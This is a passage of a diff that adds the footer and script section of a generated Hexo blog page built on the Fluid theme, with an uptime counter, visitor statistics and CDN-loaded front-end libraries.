+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/LabelPage.js"></script>
+<script src="/js/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
